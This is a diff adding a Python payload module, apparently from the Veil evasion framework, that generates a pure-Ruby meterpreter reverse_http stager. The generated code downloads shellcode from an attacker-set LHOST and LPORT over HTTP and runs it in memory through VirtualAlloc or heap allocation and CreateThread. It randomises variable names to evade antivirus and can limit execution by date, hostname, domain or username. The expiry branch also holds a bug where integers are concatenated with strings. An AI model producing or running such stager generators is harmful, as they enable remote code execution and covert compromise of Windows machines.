@@ -1,0 +1,151 @@
+"""
+
+Custom-written pure ruby meterpreter/reverse_http stager.
+
+TODO: better randomization
+
+Module built by @harmj0y
+Updated by @ChrisTruncer
+
+"""
+
+from datetime import date
+from Tools.Evasion.evasion_common import evasion_helpers
+
+
+class PayloadModule:
+
+    def __init__(self, cli_obj):
+        # required options
+        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
+        self.language = "ruby"
+        self.extension = "rb"
+        self.rating = "Normal"
+        self.name = "Pure Ruby Reverse HTTP Stager"
+        self.path = "ruby/meterpreter/rev_http"
+        self.cli_opts = cli_obj
+        if cli_obj.ordnance_payload is not None:
+            self.payload_type = cli_obj.ordnance_payload
+        elif cli_obj.msfvenom is not None:
+            self.payload_type = cli_obj.msfvenom
+        elif not cli_obj.tool:
+            self.payload_type = ''
+        self.cli_shellcode = False
+
+        # options we require user ineraction for- format is {Option : [Value, Description]]}
+        self.required_options = {
+            "LHOST"          : ["", "The listen target address"],
+            "LPORT"          : ["4444", "The listen port"],
+            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
+            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
+            "HOSTNAME"       : ["X", "Optional: Only run on specified hostname"],
+            "DOMAIN"         : ["X", "Optional: Required internal domain"],
+            "USERNAME"       : ["X", "Optional: The required user account"]
+        }
+
+    def generate(self):
+
+        # How I'm tracking the number of nested tabs needed
+        # to make the payload
+        num_ends_required = 0
+        payload_code = ''
+
+        payload_code += "require 'rubygems';require 'win32/api';require 'socket';require 'net/http';include Win32\n"
+        # Add logic for adding this line, stupid bug and I have no idea
+        # why this is even a problem, but ruby is dumb
+        if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X":
+            pass
+        else:
+            payload_code += "exit if Object.const_defined?(:Ocra)\n"
+
+        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
+
+            year = date.today().year
+            month = date.today().month
+            day = date.today().day
+
+            # Create Payload code
+            payload_code += 'require \'date\'\n'
+            payload_code += 'if Date.today < Date.parse(\'' + year + '-' + month + '-' + day + '\').next_day(' + self.required_options["EXPIRE_PAYLOAD"][0] + ')\n'
+
+            # Add a tab for this check
+            num_ends_required += 1
+
+        if self.required_options["HOSTNAME"][0].lower() != "x":
+
+            payload_code += 'require \'socket\'\n'
+            payload_code += 'hostname = Socket.gethostname.downcase\n'
+            payload_code += 'if hostname[\"' + self.required_options["HOSTNAME"][0].lower() + '\"]\n'
+
+            # Add a tab for this check
+            num_ends_required += 1
+
+        if self.required_options["DOMAIN"][0].lower() != "x":
+
+            payload_code += 'require \'socket\'\n'
+            payload_code += 'domain = Socket.gethostname.downcase\n'
+            payload_code += 'if domain[\"' + self.required_options["DOMAIN"][0].lower() + '\"]\n'
+
+            # Add a tab for this check
+            num_ends_required += 1
+
+        if self.required_options["USERNAME"][0].lower() != "x":
+
+            payload_code += 'name = ENV["USERNAME"].downcase\n'
+            payload_code += 'if name[\"' + self.required_options["USERNAME"][0].lower() + '\"]\n'
+
+            # Add a tab for this check
+            num_ends_required += 1
+
+        # randomly generate out variable names
+        ptrName = evasion_helpers.randomString()
+        threadName = evasion_helpers.randomString()
+        heap_name = evasion_helpers.randomString()
+        valloc_random = evasion_helpers.randomString()
+        rtlmove_random = evasion_helpers.randomString()
+        createthread_random = evasion_helpers.randomString()
+        waitfor_random = evasion_helpers.randomString()
+        heapcreate_random = evasion_helpers.randomString()
+        heapalloc_random = evasion_helpers.randomString()
+
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
+            payload_code += valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
+        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
+            payload_code += heapcreate_random + " = API.new('HeapCreate', 'III', 'I');" + heapalloc_random + " = API.new('HeapAlloc', 'III', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
+
+        payload_code += "def ch()\n"
+        #payload_code += "\tchk = (\"a\"..\"z\").to_a + (\"A\"..\"Z\").to_a + (\"0\"..\"9\").to_a\n"
+        #payload_code += "\t32.times do\n"
+        #payload_code += "\t\turi = chk.sample().join()\n"
+        #payload_code += "\t\tchk.sort_by {rand}.each do |x|\n"
+        #payload_code += "\t\t\treturn(uri + x) if (uri + x).unpack(\"C*\").inject(:+) % 0x100 == 92\n"
+        #payload_code += "\t\tend\n"
+        #payload_code += "\tend\n"
+        payload_code += "\treturn \"WEZf\"\n"
+        payload_code += "end\n"
+
+        payload_code += "def ij(sc)\n"
+        payload_code += "\tif sc.length > 1000\n"
+
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
+            payload_code += "\t\tpt = " + valloc_random + ".call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)\n"
+            payload_code += "\t\tx = " + rtlmove_random + ".call(pt,sc,sc.length)\n"
+            payload_code += "\t\tx = " + waitfor_random + ".call(" + createthread_random + ".call(0,0,pt,0,0,0),0xFFFFFFF)\n"
+        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
+            payload_code += heap_name + " = " + heapcreate_random + ".call(0x0004,(sc.length > 0x1000 ? sc.length : 0x1000), 0)\n"
+            payload_code += ptrName + " = " + heapalloc_random + ".call(" + heap_name + ", 0x00000008, sc.length)\n"
+            payload_code += "x = " + rtlmove_random + ".call(" + ptrName + ",sc,sc.length); " + threadName + " = " + createthread_random + ".call(0,0," + ptrName + ",0,0,0); x = " + waitfor_random + ".call(" + threadName + ",86400)\n"
+
+        payload_code += "\tend\nend\n"
+
+        payload_code += "uri = URI.encode(\"http://%s:%s/#{ch()}\")\n" % (self.required_options["LHOST"][0], self.required_options["LPORT"][0])
+        payload_code += "uri = URI(uri)\n"
+        payload_code += "ij(Net::HTTP.get(uri))\n"
+
+        # Close out all the if statements
+        for iteration in range(num_ends_required):
+            payload_code += 'end\n'
+
+        self.payload_source_code = payload_code
+        return
